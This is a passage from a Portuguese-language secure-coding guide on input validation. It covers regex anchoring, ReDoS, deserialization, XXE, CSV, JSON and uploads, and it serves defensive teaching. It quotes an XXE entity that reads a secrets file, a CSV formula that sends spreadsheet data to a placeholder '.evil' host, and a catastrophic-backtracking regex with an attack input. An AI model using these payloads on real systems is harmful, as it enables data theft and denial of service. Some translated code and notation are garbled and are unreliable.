entradas.</p> <h2 id=usando-expressoes-regulares-para-validacao-de-entrada-de-texto>Usando expressões regulares para validação de entrada de texto<a class=headerlink href=#usando-expressoes-regulares-para-validacao-de-entrada-de-texto title="Permanent link">¶</a></h2> <p>Muitos programas precisam validar rapidamente textos de entrada de fontes não confiáveis. Embora existam muitas maneiras de fazer isso, as expressões regulares costumam ser uma ferramenta especialmente útil para a validação de texto de entrada. As expressões regulares geralmente são rápidas de escrever (portanto, levam muito pouco tempo de desenvolvimento), fáceis de usar e amplamente disponíveis.</p> <p>Elas também são flexíveis o suficiente para muitas tarefas de validação de entrada, compactas e normalmente executam muito rapidamente. Elas também são amplamente conhecidas e compreendidas. Essas são vantagens importantes; se escrever a validação de entrada for muito difícil, ela não será feita.</p> <p>Elas não resolvem todos os problemas possíveis de validação de entrada, mas são úteis o suficiente para que seja importante conhecê-las.</p> <p>Expressões regulares eram originalmente usadas em softwares para <em>buscar</em> padrões de texto, não para validar entradas de texto em relação a um padrão.</p> <p>Expressões regulares também são boas para validar entradas de texto, mas há algumas coisas que você precisa saber para poder usá-las corretamente na validação de entradas de texto.</p> <p>Um problema fundamental com regex é que, por padrão, a maioria das implementações de regex <em>busca</em> se um determinado padrão pode ser encontrado em algum lugar dentro de um texto.</p> <p>Quando estamos fazendo a validação de entrada, não queremos buscar; <strong>queremos saber se todo o texto inserido <em>corresponde exatamente</em> a um padrão</strong>.</p> <p>Isso significa que precisamos ser capazes de perguntar à implementação da regex <em>"este texto inserido corresponde exatamente a este padrão?"</em> - [ ] e rejeitar a entrada se ela não corresponder. Como em qualquer outra validação de entrada, precisamos tornar nosso padrão o mais limitante possível e, se a entrada não corresponder, rejeitá-la.</p> <p>A maneira usual de exigir que uma regex corresponda a uma entrada inteira é incluir <em>âncoras</em> na regex.</p> <p>Basta iniciar seu padrão de regex com uma <em>âncora inicial</em> — geralmente representada por " <strong>^</strong> " ou, às vezes, " <strong>\A</strong> " — e terminar o padrão com " <strong>$</strong> " ou, às vezes, " <strong>\z</strong> ".</p> <p>Com isso, toda a entrada deve corresponder ao padrão. Por exemplo, esta regex corresponderá a <em>qualquer</em> texto que contenha " <strong>cab</strong> ", " <strong>car</strong> " ou " <strong>cat</strong> " — e corresponderá até mesmo a " <strong>abdicate</strong> " — portanto, você <em>não</em> deve usar uma regex como esta para validação de entrada:</p> <p><strong>ca[brt]</strong></p> <p>Em contraste, esta regex só corresponderá <em>exatamente</em> às palavras " <strong>cab</strong> ", " <strong>car</strong> " ou " <strong>cat</strong> " em muitas implementações de regex, porque " <strong>^</strong> " geralmente significa " <em>corresponder ao início</em> " e " <strong>$</strong> " geralmente significa " <em>corresponder ao final</em> ":</p> <p><strong>^ca[brt]$</strong></p> <p>Em algumas implementações (dependendo da opção), " <strong>^</strong> " pode significar " <em>início de qualquer linha</em> ", não " <em>início da string</em> " — e geralmente você quer " <em>início da string</em> ".</p> <p>Um " <strong>?</strong> " significa " <em>fim da string</em> " em algumas implementações, mas não em outras. Como as notações de expressões regulares variam, é importante conhecer seu sistema específico de expressões regex.</p> <p>As notações regex <em>não</em> são as mesmas entre diferentes linguagens e bibliotecas. Quase todas as linguagens de programação têm pelo menos uma boa implementação de regex e todas compartilham muitas características. No entanto, elas costumam ser ligeiramente diferentes.</p> <p>Portanto, ao usar uma implementação de regex que você nunca usou antes, consulte a documentação sempre que usar uma operação que você nunca usou antes. Além disso, tenha cuidado ao reutilizar um padrão. Aqui estão algumas variações para procurar.</p> <table> <thead> <tr> <th></th> <th></th> </tr> </thead> <tbody> <tr> <td>Expressão regular básica (BRE)</td> <td>Este é o padrão para <strong>grep</strong>  e <strong>sed</strong>. É definido pelo padrão POSIX. No entanto, sua sintaxe às vezes é um pouco estranha, então, na maioria dos casos, é mais fácil usar expressões regulares estendidas para validação de entrada.</td> </tr> <tr> <td>Expressão regular estendida (ERE)</td> <td>Isso é definido pelo padrão POSIX e adiciona recursos como o uso de parênteses para agrupamento e " <strong>+</strong> " para <em>"um ou mais"</em>. Isso é frequentemente usado em programas em C. Assim, por exemplo, " <strong>[BD]+</strong> " significa <em>"uma ou mais das letras B, C ou D"</em>.</td> </tr> <tr> <td>Expressões regulares compatíveis com Perl (PCRE)</td> <td>Esta é principalmente uma extensão do formato ERE; muitas outras linguagens de programação usam esta família de linguagens regex. Inclui recursos como " <strong>\d</strong> " para representar dígitos.</td> </tr> <tr> <td>Aqui estão algumas coisas importantes que variam:</td> <td></td> </tr> </tbody> </table> <ol> <li>Às vezes, há uma opção ou método alternativo para corresponder a toda a entrada; se disponível, você pode usá-lo em vez dos símbolos de ancoragem. No entanto, certifique-se de que corresponda a tudo; alguns métodos verificam apenas o início.</li> <li>Às vezes, " <strong>^</strong> " corresponde ao início de todos os dados, enquanto em outras representa o início de qualquer linha nos dados. Isso geralmente é controlado por uma opção <em>multilinha</em>.</li> <li>Às vezes, " <strong>$</strong> " corresponde ao final de todos os dados, enquanto em outros representa o final de qualquer linha nos dados. Em alguns sistemas, um caractere de nova linha opcional (ou similar) também é sempre aceito. Em alguns sistemas, você deve usar " <strong>\z</strong> " para corresponder ao final dos dados, mas em Python, você deve usar " <strong>\Z</strong> ".</li> <li>O " <strong>.</strong> " para representar <em>"qualquer caractere"</em> nem sempre corresponde ao caractere de nova linha ( <strong>\n</strong> ); muitas vezes, há uma opção para ativar ou desativar isso.</li> <li>Alguns oferecem suporte adequado ao Unicode e à codificação que você está usando; outros não.</li> <li>Alguns podem manipular dados com o caractere <strong>NUL</strong> (valor de byte 0) dentro dos dados; outros não. Caso contrário, e seus dados de entrada podem ter um caractere <strong>NUL</strong> incorporado , você precisará validar os dados primeiro para garantir que não haja caracteres <strong>NUL</strong> antes de passá-los para a implementação da expressão regular.</li> <li>Alguns diferenciam maiúsculas de minúsculas por padrão; outros não. Normalmente, diferenciam maiúsculas de minúsculas por padrão, e há uma maneira simples de torná-lo insensível a maiúsculas e minúsculas. Se não diferenciar maiúsculas de minúsculas, lembre-se de que exatamente quais caracteres têm correspondências que diferenciam maiúsculas de minúsculas depende da localidade. Por exemplo, " <strong>I</strong> " e " <strong>i</strong> " correspondem em inglês (" <strong>en</strong> ") e na localidade C (" <strong>C</strong> "), mas não em turco (" <strong>tr</strong> "). Na localidade turca, a LETRA MAIÚSCULA I do Unicode corresponde à LETRA MINÚSCULA I do Latim sem ponto — não a um " <strong>i</strong> " minúsculo.</li> </ol> <p>A tabela a seguir mostra como criar um padrão regex que corresponda a uma string de entrada inteira para algumas plataformas comuns, conforme fornecido em " <a href=https://best.openssf.org/Correctly-Using-Regular-Expressions>Usando Expressões Regulares Corretamente para Validação Segura de Entrada"</a>. Não é necessário memorizar isso; o importante é garantir que você use os símbolos corretos para a plataforma que está usando.</p> <h2 id=prioridade-de-filial>Prioridade de Filial<a class=headerlink href=#prioridade-de-filial title="Permanent link">¶</a></h2> <p>Quase todas as implementações de expressões regulares suportam <em>ramificações</em> — ou seja, " <strong>aa|bb|cc</strong> " corresponde <strong>a aa</strong> , <strong>bb</strong> ou <strong>cc</strong>. Todas as implementações de ERE e PCRE suportam ramificações, e até mesmo algumas implementações de BRE suportam ramificações se forem escritas como " <strong>|</strong> " em vez de " <strong>|</strong> ". A <em>prioridade</em> da operação de ramificação é padrão, mas não é o que alguns usuários esperam. A expressão regular " <strong>^aa|bb<span class=arithmatex>\(** " significa _"começa com aa OU termina com bb"_ , não _"exatamente aa ou bb"_. Ao usar expressões regulares para validação de entrada, uma sequência de ramificações que não esteja entre parênteses é praticamente sempre um erro. O que você normalmente quer é " **^(aa|bb)\)</span></strong> ", que significa <em>"exatamente aa ou bb"</em>.</p> <h2 id=validadores-de-entrada-de-teste>Validadores de entrada de teste<a class=headerlink href=#validadores-de-entrada-de-teste title="Permanent link">¶</a></h2> <p>Novamente, você deve saber o que seu software não deve aceitar e usar alguns desses exemplos como casos de teste automatizados para garantir que seu software os rejeitará corretamente. Isso é especialmente importante com regexes, pois é fácil escrever uma regex que pareça boa, mas permita entradas que não foram planejadas. Isso pode ajudar a detectar, por exemplo, âncoras ausentes ou falhas ao delimitar ramificações com parênteses.</p> <h2 id=combatendo-ataques-redos-em-expressoes-regulares-i>Combatendo ataques ReDoS em expressões regulares I<a class=headerlink href=#combatendo-ataques-redos-em-expressoes-regulares-i title="Permanent link">¶</a></h2> <p>Ao adicionar código, existe o risco de que ele contenha uma vulnerabilidade. Isso é especialmente verdadeiro quando você adiciona um código que supostamente ajuda a manter seu software seguro, já que, por definição, problemas nesse código podem levar a um problema de segurança.</p> <p>Se você adicionar verificações de validação de entrada usando expressões regulares — uma abordagem comum e útil —, existe um tipo de vulnerabilidade que você pode adicionar involuntariamente, chamada de <strong><em>Negação de Serviço de Expressão Regular (ReDoS)</em></strong>.</p> <p>Se o seu software tiver uma vulnerabilidade de ReDoS, os invasores podem forçar situações em que a expressão regular pode ser executada por um tempo extremamente longo (possivelmente dias ou anos). O resultado é uma negação de serviço (DoS) — o ataque pode enviar uma pequena quantidade de dados e fazer com que o serviço fique indisponível.</p> <p>Em 2020, o pacote <strong>npm websocket-extensions</strong> e sua versão Ruby foram encontrados com essa falha (eles receberam os identificadores <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-7662">CVE-2020-7662</a> e <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-7663">CVE-2020-7663,</a> respectivamente).</p> <p>A razão pela qual a vulnerabilidade ReDoS é possível é que a maioria das implementações de regex tem uma complexidade de pior caso que cresce exponencialmente com base no tamanho da entrada.</p> <p>Existem duas abordagens principais para implementar regexes: um <em>autômato finito determinístico</em> (DFA) ou <em>um autômato finito não determinístico</em> (NFA).</p> <p>Os DFAs são rápidos, em parte porque nunca retrocedem, e são imunes a vulnerabilidades ReDoS. Mas os DFAs também são limitados no que podem fazer. Na prática, a maioria das implementações de regex hoje são NFAs, e NFAs <strong>são</strong> potencialmente vulneráveis ​​a ataques ReDoS.</p> <p>Implementações NFA de regexes — e isso é a maioria delas — <em>retrocedem</em> sempre que falham em uma correspondência específica até encontrarem uma correspondência ou tentarem todas as possibilidades. Em resumo, no pior cenário, elas tentam <em>todas</em> as combinações. Para muitos padrões de expressões regulares, esse pior caso não é um problema. No entanto, certos tipos de padrões de regex podem tornar esse pior caso realmente ruim.</p> <h2 id=combatendo-ataques-redos-em-expressoes-regulares-ii>Combatendo ataques ReDoS em expressões regulares II<a class=headerlink href=#combatendo-ataques-redos-em-expressoes-regulares-ii title="Permanent link">¶</a></h2> <p>Em particular, vamos imaginar que fornecemos um padrão onde:</p> <ul> <li>O padrão regex usa repetição em subexpressões complexas (o uso de " <strong>+</strong> " e " ***** " em subexpressões complexas) e</li> <li>Dentro dessas subexpressões repetidas, há símbolos de repetição e expressões adicionais que correspondem a um sufixo de outra correspondência ( <a href=https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS>OWASP ReDoS</a> ).</li> </ul> <p>Um exemplo trivial é o padrão regex " <strong>^(a+)+$</strong> ". Imagine que um invasor forneceu o valor de entrada " <strong>aaaaX</strong> ". Um NFA combinará facilmente a primeira letra " <strong>a</strong> " da entrada com o "a" do padrão, mas a implementação do regex tem duas opções: tentar aplicar o " <strong>+</strong> <em>" interno</em> ou o " <strong>+</strong> <em>" externo</em> à próxima letra? A maioria das implementações tentaria o interno primeiro e, em seguida, retrocederia conforme necessário. Na pior das hipóteses, um NFA precisa testar <em>todas</em> as combinações possíveis. Assim, para determinar se a entrada " <strong>aaaaX</strong> " corresponde ao padrão, um regex NFA precisa testar 16 caminhos possíveis (todas as possibilidades), com cada um eventualmente falhando devido ao " <strong>X</strong> " final. Se o invasor fornecer a entrada " <strong>aaaaaaaaaaaaaaaaaX</strong> ", haveria 65.536 caminhos possíveis, com o número de caminhos dobrando para cada " <strong>a</strong> " adicional. Se um invasor fornecesse 80 " <strong>a</strong> "s seguidos de " <strong>X</strong> ", esse thread tentaria processar todas as combinações, o que levaria tanto tempo que se tornaria uma negação de serviço.</p> <p>Usamos o termo <em>"regexes vulneráveis"</em> para padrões de regex com esse terrível comportamento de pior caso. Um termo comum na indústria para esses padrões é <strong>"regexes malignas"</strong>. Não é que a regex seja necessariamente fornecida por um invasor, é apenas que seu pior comportamento é "mau" e isso o torna vulnerável a ataques. Outro termo para esse comportamento é <em>"retrocesso catastrófico"</em>.</p> <p>Existem muitas soluções para esse problema, incluindo as seguintes:</p> <ol> <li>Use uma implementação de regex que utilize um DFA. Implementações baseadas em DFA não são vulneráveis ​​a esse problema. Por exemplo, no ecossistema NPM, " <strong>re2</strong> " implementa um mecanismo de regex DFA. No entanto, mecanismos de regex baseados em DFA geralmente são menos eficientes e, em muitos ambientes, muito mais difíceis de instalar e usar, portanto, isso raramente é feito.</li> <li>Modifique a regex para que ela não apresente esse comportamento de pior caso. Essa é a abordagem usual. Seja especialmente cauteloso com qualquer grupo " <strong>(...)</strong> " que contenha uma ramificação e/ou termine com uma repetição e seja ele próprio repetido. Algumas ferramentas examinam o código-fonte para detectar regexes com comportamentos de pior caso (podem ser ferramentas independentes ou parte de ferramentas maiores).<ol> <li>Se houver uma repetição ou ramificação em uma expressão regular que também seja repetida, reescreva a expressão regular de forma que o próximo caractere na entrada determine inequivocamente se a repetição continua ou não. Por exemplo, reescreva " <strong>^(a+)+<span class=arithmatex>\(** " como " **^a+\)</span></strong> ".</li> <li>Outra abordagem é usar mecanismos que dizem ao mecanismo de regex para não retroceder; muitas implementações de regex têm <em>quantificadores possessivos</em> e/ou <em>agrupamento atômico</em> , o que pode evitar retrocessos desnecessários.</li> <li>Evite repetições ilimitadas. Por exemplo, defina contagens máximas de repetições (por exemplo, <strong>{0,5}</strong> ) para que o pior comportamento seja bastante limitado.</li> </ol> </li> <li>Sempre que possível, limite o comprimento máximo das strings de entrada e verifique o comprimento da entrada primeiro. Se as entradas precisarem ser curtas, o crescimento exponencial no tempo ainda resultará em um pequeno período total.</li> <li>Implemente um tempo limite na expressão regular (se suportado) ou na aplicação como um todo. Por exemplo, <a href=https://www.ruby-lang.org/en/news/2022/04/03/ruby-3-2-0-preview1-released/ >o Ruby 3.2</a> suporta um valor de tempo limite global para expressões regulares ( <strong>Regexp.timeout</strong> ) e um parâmetro de tempo limite ao instanciar um objeto de expressão regular. Os <a href=https://docs.microsoft.com/en-us/dotnet/api/system.text.regularexpressions.regex.matchtimeout>mecanismos MatchTimeout do.NET Framework</a> também podem definir um valor de tempo limite global ou um para cada expressão regular.</li> <li>Não execute regexes fornecidas por invasores em sistemas que não sejam os seus. É aceitável que um invasor forneça uma regex que ele próprio sempre execute (nesse caso, os invasores simplesmente atacam a si mesmos). Mas se os invasores puderem fornecer regexes que você executa, eles poderão causar um ReDOS (a menos que você tenha tomado outras medidas para evitá-lo). Regexes são, em geral, linguagens de programação, e você deve evitar executar programas fornecidos por invasores. É possível fazer isso com relativa segurança, mas é preciso tomar muitas precauções e é sempre mais seguro simplesmente não fazê-lo.</li> </ol> <p>Se você estiver interessado em mais detalhes, veja a <a href=https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS>discussão do OWASP</a> sobre isso.</p> <p><strong>Observação:</strong> ReDoS geralmente <em>não</em> é uma vulnerabilidade real. Essas expressões regulares <em>só</em> podem ser uma vulnerabilidade se forem executadas em um sistema confiável e processarem entradas não confiáveis. Existem muitas ferramentas que podem detectar expressões regulares vulneráveis ​​a ReDoS, mas não determinam se as fontes de entrada não são confiáveis. Essas ferramentas podem inundar os desenvolvedores com as chamadas "vulnerabilidades" que, na verdade, não são vulnerabilidades. Além disso, em alguns casos, contramedidas (como tamanhos máximos de entrada e timeouts) efetivamente eliminam a eficácia do ReDoS. Mesmo quando uma expressão regular processa entradas não confiáveis ​​e essas contramedidas falham, o ReDoS, no <em>máximo,</em> causará uma negação de serviço, não uma perda de confidencialidade ou integridade. Portanto, embora o ReDoS possa ser uma vulnerabilidade real, geralmente não é uma vulnerabilidade ou é menos importante. Se você estiver lidando com um grande número de relatórios de vulnerabilidades de ReDoS, verifique novamente para ver se essas são vulnerabilidades reais. (Veja <a href=https://blog.yossarian.net/2022/12/28/ReDoS-vulnerabilities-and-misaligned-incentives><em>"Vulnerabilidades" do ReDoS e incentivos desalinhados</em></a> <a href=https://blog.yossarian.net/2022/12/28/ReDoS-vulnerabilities-and-misaligned-incentives>"</a> <a href=https://blog.yossarian.net/2022/12/28/ReDoS-vulnerabilities-and-misaligned-incentives>do Enosuchblog</a>.)</p> <h2 id=desserializacao-insegura>Desserialização Insegura<a class=headerlink href=#desserializacao-insegura title="Permanent link">¶</a></h2> <p>Não aceite cegamente formatos de dados mais complexos. Em vez disso, certifique-se de que aceitar essa entrada de uma fonte não confiável não causará problemas de segurança.</p> <p><strong>A desserialização</strong> é o processo de converter uma sequência (de bytes ou caracteres) em um formato interno; esse processo pode criar diversos objetos.</p> <p>A desserialização pode ocorrer durante a leitura de dados de uma rede ou de um armazenamento, pois em ambos os casos é necessário converter uma sequência de bytes ou caracteres em um formato interno.</p> <p>Infelizmente, a desserialização pode resultar em sérios problemas, pois, se a fonte não for confiável, o invasor pode fornecer uma sequência manipulada:</p> <ul class=task-list> <li class=task-list-item><label class=task-list-control><input disabled type=checkbox><span class=task-list-indicator></span></label> Os dados podem ser convertidos em um valor inesperado no qual você não deve confiar. Por exemplo, pode ser um valor de cookie estruturado que originalmente dizia <strong>admin=n</strong> , mas o invasor pode alterar o valor para <strong>admin=y</strong>. Se o programa aceitasse esses dados cegamente, o invasor poderia repentinamente se tornar um administrador!</li> <li class=task-list-item><label class=task-list-control><input disabled type=checkbox><span class=task-list-indicator></span></label> A desserialização dos dados pode causar execução de código, por exemplo, criando classes ou instâncias e/ou chamando métodos selecionados pelo invasor com argumentos fornecidos por ele. Isso é especialmente problemático para formatos projetados para persistência arbitrária de objetos. Um exemplo disso é o formato pickle do Python, que executa código automaticamente em certos casos ao desserializar dados.</li> </ul> <p>Se você precisar aceitar objetos serializados de fontes não confiáveis, poderá usar formatos de serialização que não suportem a execução de código.</p> <p>Por exemplo, use formatos de serialização que permitam apenas tipos de dados primitivos. Isso resolve o segundo problema – a execução de código – mas, por si só, não resolve o primeiro problema – valores inesperados. Portanto, após escolher uma abordagem para impedir a execução de código, valide a entrada recebida usando as abordagens que já discutimos.</p> <p>Em alguns casos, você pode evitar ataques de desserialização com verificações de autenticação. Basicamente, transforme dados não confiáveis ​​em dados confiáveis!</p> <p>Para fazer isso, antes de desserializar os dados, execute uma verificação de autenticação para garantir que os dados sejam de uma fonte confiável. Uma maneira comum de fazer isso é verificar uma assinatura digital, um código de autenticação de mensagem (MAC), uma criptografia autenticada ou uma medida semelhante. Essa abordagem é especialmente comum em aplicações web; frequentemente, um servidor web envia dados a um cliente para que este possa enviá-los de volta posteriormente (por exemplo, como um cookie). Essa abordagem é adequada, desde que o servidor web verifique sua integridade (para evitar a criação ou adulteração por invasores) <em>antes</em> da desserialização.</p> <p>Algumas pessoas recomendam a aplicação de restrições do tipo string (por exemplo, permitindo que apenas classes específicas sejam desserializadas). Infelizmente, muitas soluções alternativas para essa técnica foram encontradas ao longo dos anos. É uma boa ideia como técnica <em>de proteção</em> (ou simplesmente como forma de detectar bugs precocemente). No entanto, em muitos sistemas, isso provavelmente é perigoso demais para ser recomendado como uma defesa adequada por si só.</p> <h2 id=estruturas-de-dados-de-entrada-xml>Estruturas de dados de entrada: XML<a class=headerlink href=#estruturas-de-dados-de-entrada-xml title="Permanent link">¶</a></h2> <p>Muitos dados e mensagens são codificados em XML (Extensible Markup Language). XML faz parte de outros formatos, como SOAP (Simple Object Access Protocol). Há dois termos sobre XML que são amplamente confundidos:</p> <ul> <li><strong>XML bem-formado</strong> segue certas regras de sintaxe. Por exemplo, todas as tags abertas devem ser fechadas e os elementos XML devem estar aninhados corretamente. Se você estiver aceitando XML, pelo <em>menos</em> verifique se ele está bem-formado; existem bibliotecas facilmente disponíveis para isso, e os aplicativos devem aceitar apenas XML bem-formado.</li> <li>**XML válido **atende a alguma definição de esquema. O esquema especifica informações como  <em>quais</em> tags são permitidas, como elas podem ser aninhadas e se algumas são necessárias. Uma definição de esquema, se rigorosa, é uma espécie de lista de permissões. Portanto, verificar a validade antes de aceitar a entrada XML pode ser muito útil para combater ataques. No entanto, não <em>permita</em> que o invasor determine qual esquema usar - decida qual esquema é aceitável e use <em>-o</em>. Às vezes, nenhum esquema está disponível e, se você estiver extraindo apenas uma pequena parte do XML, pode não valer a pena criar um esquema XML.</li> </ul> <p>Se você usa XML, existe uma vulnerabilidade extremamente comum que você precisa combater, chamada Entidades Externas XML (XXE). Para entendê-las, você precisa entender algumas funcionalidades do XML que não são amplamente conhecidas.</p> <p>O XML suporta referências externas que podem ser carregadas automaticamente quando o documento original é carregado. A referência externa pode ser qualquer local de arquivo ou URL. Isso significa que um invasor pode fornecer arquivos que silenciosamente fazem com que outros arquivos ou URLs sejam carregados e colocados em determinados locais. Essa funcionalidade existe por um motivo, e alguns sistemas dependem legitimamente dela. No entanto, muitos desenvolvedores não têm ideia de que isso é possível, o que levou a muitas vulnerabilidades. Aqui está um exemplo de um documento XML com entidades externas incorporadas:</p> <div class=highlight><pre><span></span><code>**&lt;!DOCTYPE html PÚBLICO "-//W3C//DTD XHTML 1.1//EN" "h‌t‌‌tp://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd"&gt;**
**&lt;!DOCTYPE letra [
******&lt;!ENTIDADE parte1 SISTEMA "ht‌tp://www.example.com/part1.x..."&gt;
********&lt;!ENTIDADE parte2 SISTEMA "../../../secrets/part2.xml"&gt;
]&gt;...
&lt;edifício&gt;
&amp;part1; &amp;part2; &lt;/
edifício&gt;****
</code></pre></div> <p>Em geral, você não deve aceitar referências externas não verificadas de fontes não confiáveis. Aqui estão algumas soluções possíveis:</p> <ul> <li>Configure seu leitor/processador de XML para ignorar ou rejeitar referências externas.</li> <li>Certifique-se de verificar, em seus testes automatizados, se ele ainda está sendo ignorado!</li> <li>Como a maioria dos aplicativos não usa entidades externas, esta costuma ser a solução mais fácil.</li> <li>Proíba ou verifique (com uma lista de permissões) qualquer referência externa antes de usar.</li> <li>Não use XML, incluindo formatos como SOAP, que usam XML. Outros formatos, como JSON, não possuem esse mecanismo e, portanto, não podem apresentar esse problema.</li> </ul> <p>Para mais informações sobre esses problemas, consulte a <a href=https://owasp.org/www-project-top-ten/2017/A4_2017-XML_External_Entities_\(XXE\).html>página da Web OWASP XML External Entities</a>.</p> <h1 id=estruturas-de-dados-de-entrada-html>Estruturas de dados de entrada: HTML<a class=headerlink href=#estruturas-de-dados-de-entrada-html title="Permanent link">¶</a></h1> <p>Normalmente, você pode simplesmente chamar uma biblioteca para validar HTML e passar um conjunto de tags permitidas (por exemplo, <code>&lt;p&gt;</code> ) e atributos (por exemplo, <code>href=</code> ). Tudo o que não for permitido será removido ou rejeitado. Isso eliminará tags perigosas como <code>&lt;script&gt;</code> de fontes externas (presumindo que você não inclua tags perigosas no conjunto de tags permitidas).</p> <p>Embora este seja um tópico potencialmente amplo, na prática, a chave geralmente é usar uma biblioteca com padrões de segurança decentes. Se você permitir apenas tags como <code>&lt;p&gt; , &lt;i&gt; e &lt;b&gt;</code> , e limitar os atributos a valores como <code>id</code> , a quantidade de dano que pode ser causada será bastante limitada.</p> <h2 id=estruturas-de-dados-de-entrada-csv>Estruturas de dados de entrada: CSV<a class=headerlink href=#estruturas-de-dados-de-entrada-csv title="Permanent link">¶</a></h2> <p>O formato "valores separados por vírgula" (CSV) é, em teoria, simples. Cada linha é um registro, onde os campos são separados por vírgulas. A primeira linha geralmente é uma "linha de cabeçalho" — os nomes dos campos são separados por vírgulas (você deve sempre fornecer o cabeçalho, pois isso torna o arquivo CSV mais extensível e muito mais fácil de manipular com outras ferramentas).</p> <p>Na prática, há muita variação nos formatos CSV. No entanto, por questões de segurança, o <em>maior</em> problema é que algumas ferramentas (como o Microsoft Excel e o LibreOffice) <em>executam</em> certas construções ao ler CSV, mesmo que CSV pareça um formato somente de dados. Por exemplo, um valor de campo que começa com " <strong>=</strong> " é interpretado como <em>"execute estas funções"</em> e as funções podem acessar dados externos. Em algumas implementações de planilhas, o conteúdo do campo " <strong>=IMPORTXML(CONCAT(""ht‌tp://some-server-with-log.evil?v="", CONCATENATE(A2:E2)), ""//a"")</strong> " <em>enviará</em> dados da planilha para um site externo. A solução, como sempre, é validar cada valor de campo antes de aceitá-lo. Valores especialmente problemáticos são aqueles que começam com <strong>=</strong> , <strong>+</strong> , <strong>-</strong> e <strong>@</strong>.</p> <p>Ao ler esses formatos de uma fonte não confiável, certifique-se de que cada célula atenda ao formato de dados esperado e não repasse os dados de outra forma. Tenha especial cuidado com células que começam com " <strong>=</strong> " e tente evitar repassá-las, pois algumas ferramentas podem executar seu conteúdo.</p> <h2 id=estruturas-de-dados-de-entrada-json>Estruturas de dados de entrada: JSON<a class=headerlink href=#estruturas-de-dados-de-entrada-json title="Permanent link">¶</a></h2> <p>O JSON não possui a capacidade integrada de registrar entidades ou expressões externas que muitas ferramentas esperariam que fossem executadas, o que o torna uma vantagem do ponto de vista da segurança. Existem ferramentas que podem validar facilmente a sintaxe JSON, frequentemente implementadas como parte da leitura de JSON em um formato interno útil.</p> <p>Se quiser ir mais além, existem formatos como o JSON Schema, que permitem definir com mais rigor o formato exato de um determinado JSON. Você pode usar validadores de JSON Schema para verificar se os dados correspondem ao esquema.</p> <h2 id=estruturas-de-dados-de-entrada-uploads-de-arquivos>Estruturas de dados de entrada: uploads de arquivos<a class=headerlink href=#estruturas-de-dados-de-entrada-uploads-de-arquivos title="Permanent link">¶</a></h2> <p>Às vezes, você precisa aceitar uploads de arquivos de tipos especiais (por exemplo, de imagens). Se o seu programa permitir uploads, tente limitá-los a tipos de arquivo específicos e certifique-se (tanto pelo tipo MIME quanto pelo conteúdo) de que seja um dos tipos válidos que você aceitará.</p> <p>Limite também o que você permite no nome do arquivo; caracteres alfanuméricos geralmente funcionam bem, mas qualquer outro caractere (especialmente <code>/</code> e <code>\</code>) pode ser problemático, portanto, permita apenas os caracteres que você tem certeza de que funcionarão. Sempre que possível, defina uma lista de sufixos de nome de arquivo permitidos e permita uploads apenas de arquivos nomeados com um desses sufixos permitidos.</p> <h1 id=minimizando-a-superficie-de-ataque-identificacao-autenticacao-e-autorizacao>Minimizando a superfície de ataque, identificação, autenticação e autorização<a class=headerlink href=#minimizando-a-superficie-de-ataque-identificacao-autenticacao-e-autorizacao title="Permanent link">¶</a></h1> <p>Observamos que é importante minimizar a <em>superfície de ataque</em> – ou seja, as interfaces às quais o invasor pode ter acesso. Isso não significa <em>"limitar as interfaces que você <strong>pretende</strong> que os usuários utilizem"</em> ; sua <em>implementação</em> deve limitar as interfaces às quais um invasor tem acesso. Tente fazer com que os invasores não consigam <em>acessar</em> a maioria das interfaces e, em seguida, proteja cuidadosamente as interfaces acessíveis.</p> <p>Dito isso, em muitos sistemas, invasores poderão tentar realizar algumas solicitações. Nesses casos, você precisará garantir que a solicitação seja autorizada (permitida) antes de ser atendida. Lembre-se: autorização significa determinar se a solicitação é permitida ou não para aquela pessoa ou programa.</p> <p>Você precisa <em>verificar</em> se uma solicitação é <em>autorizada</em> em <em>absolutamente todos os casos</em> , caso não seja. Ou seja, certifique-se de que as verificações de autorização não sejam passíveis de bypass.</p> <p>As ferramentas geralmente não são boas em determinar se todas as solicitações são verificadas para autorização, então você normalmente precisa depender principalmente da revisão humana.</p> <p>Se os humanos puderem ver facilmente que a verificação de autorização correta é feita para cada solicitação, leva muito menos tempo para revisar <em>e</em> é mais provável que esteja correta. Na prática, isso geralmente significa que os programas devem verificar a autorização assim que você puder fazê-lo razoavelmente.</p> <p>O que isso significa exatamente depende do seu sistema, por exemplo, em uma arquitetura modelo-visão-controlador, você pode colocar verificações de autorização em cada entrada do controlador e/ou cada entrada do modelo.</p> <p>O que importa é que você faça isso consistentemente e que seja fácil para outros verificarem que isso não pode ser ignorado. Da mesma forma, os dados precisam ser armazenados para que apenas solicitações autorizadas possam ter sucesso.</p> <p>Claro, se algo requer autorização, isso significa que deve haver algum tipo de identificação e autenticação (I&amp;A) para garantir que a solicitação tenha sido feita por quem alegou ser. Verifique cuidadosamente como você lida com a autenticação e, quando possível, use serviços, bibliotecas ou frameworks respeitados para isso.</p> <p>Normalmente, você deve primeiro validar a entrada de uma identidade (como um nome de usuário ou endereço de e-mail) antes de fazer qualquer outra coisa com ela, para reduzir a probabilidade de um invasor subverter um sistema por meio de seu sistema de login.</p> <p>Na maioria dos casos, você só deve relatar "falha no login" (ou algo similar) se a combinação da identidade e da autenticação (como uma senha) falhar; não revele se a identidade existe no sistema, pois isso permite que o invasor saiba se a identidade está presente no sistema.</p> <p>Você deve oferecer suporte a logins com autenticação multifator (MFA), diretamente ou por meio de um serviço, pois estes tendem a ser mais fortes do que senhas.</p> <p>Se você oferece suporte a senhas para autenticação, siga boas práticas, como:</p> <ul class=task-list> <li class=task-list-item><label class=task-list-control><input disabled type=checkbox><span class=task-list-indicator></span></label> Certifique-se de que no máximo um caractere da senha seja exibido para um usuário por vez, para reduzir o risco de outra pessoa ver a senha (também conhecido como "olhar por cima"). Você pode fazer isso em campos de entrada HTML usando o tipo de entrada <strong>"password"</strong>.</li> <li class=task-list-item><label class=task-list-control><input disabled type=checkbox><span class=task-list-indicator></span></label> Garanta que os usuários possam usar gerenciadores de senhas ao efetuar login, criar ou alterar uma senha. Por exemplo, garanta que os usuários possam copiar texto nos campos de senha, pois essa funcionalidade é necessária para alguns gerenciadores de senhas. Forçar os usuários a digitar as senhas manualmente os incentiva a usar senhas ruins e os desencoraja a usar um gerenciador de senhas (o que é considerado uma prática recomendada por muitos).</li> <li class=task-list-item><label 